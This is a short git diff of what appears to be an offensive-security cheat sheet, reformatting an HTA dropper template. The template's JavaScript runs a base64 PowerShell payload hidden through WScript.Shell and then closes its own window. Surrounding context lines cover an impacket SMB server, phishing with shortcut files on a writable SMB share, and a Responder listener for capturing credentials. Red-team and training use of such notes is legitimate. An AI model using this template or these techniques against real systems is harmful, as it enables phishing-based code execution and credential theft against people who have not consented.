@@ -69,17 +69,16 @@ impacket-smbserver -smb2support share .
 
 ```html
 <html>
-<head>
-<HTA:APPLICATION ID="shell">
-<script language="javascript">
-		<!--Replace your payload below-->
-        var c = "<PowerShell #3 Base64 Payload>";  
-        new ActiveXObject('WScript.Shell').Run(c, 0, true); 
-</script>
-</head>
-<body>
-<script>self.close();</script>
-</body>
+    <head>
+        <HTA:APPLICATION ID="shell">
+        <script language="javascript">
+            var c = "<PowerShell #3 Base64 Payload>";  
+            new ActiveXObject('WScript.Shell').Run(c, 0, true); 
+        </script>
+    </head>
+    <body>
+        <script>self.close();</script>
+    </body>
 </html>
 ```
 
@@ -108,7 +107,7 @@ Set-Content -Path $shortcutPath -Value $shortcutContent
 
 ### Phishing with Shortcut (With SMB Share Write Permission)
 
-If you found any interaction from target to smb share (e.g., clean up)
+If you found any interaction from target to smb share (e.g. cronjob)
 
 #### Start a Local Responder Listener
 
